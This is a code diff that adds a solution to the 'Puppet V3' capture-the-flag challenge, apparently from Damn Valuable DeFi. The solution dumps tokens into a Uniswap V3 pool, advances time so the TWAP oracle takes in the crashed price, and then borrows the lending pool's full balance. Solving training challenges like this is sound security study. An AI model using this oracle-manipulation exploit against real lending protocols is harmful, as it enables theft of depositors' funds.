@@ -10,6 +10,7 @@ import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {INonfungiblePositionManager} from "../../src/puppet-v3/INonfungiblePositionManager.sol";
 import {PuppetV3Pool} from "../../src/puppet-v3/PuppetV3Pool.sol";
+import {ISwapRouter} from "@uniswap/v3-periphery/contracts/interfaces/ISwapRouter.sol";
 
 contract PuppetV3Challenge is Test {
     address deployer = makeAddr("deployer");
@@ -119,7 +120,33 @@ contract PuppetV3Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV3() public checkSolvedByPlayer {
+        // 获取主网已部署的 Uniswap V3 路由合约地址
+        ISwapRouter router = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
         
+        // 授权路由合约使用玩家的 DVT
+        token.approve(address(router), type(uint256).max);
+        
+        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter.ExactInputSingleParams({
+            tokenIn: address(token),
+            tokenOut: address(weth),
+            fee: FEE,
+            recipient: player,
+            deadline: block.timestamp,
+            amountIn: PLAYER_INITIAL_TOKEN_BALANCE,
+            amountOutMinimum: 0,
+            sqrtPriceLimitX96: 0
+        });
+
+        router.exactInputSingle(params);
+        
+        weth.approve(address(lendingPool), type(uint256).max);
+        
+        // 操纵预言机。快进 114 秒（接近挑战限制的 115 秒），让刚才砸盘导致的低价在 TWAP 计算中生效。
+        vm.warp(block.timestamp + 114); 
+        
+        lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+        
+        token.transfer(recovery, LENDING_POOL_INITIAL_TOKEN_BALANCE);
     }
 
     /**
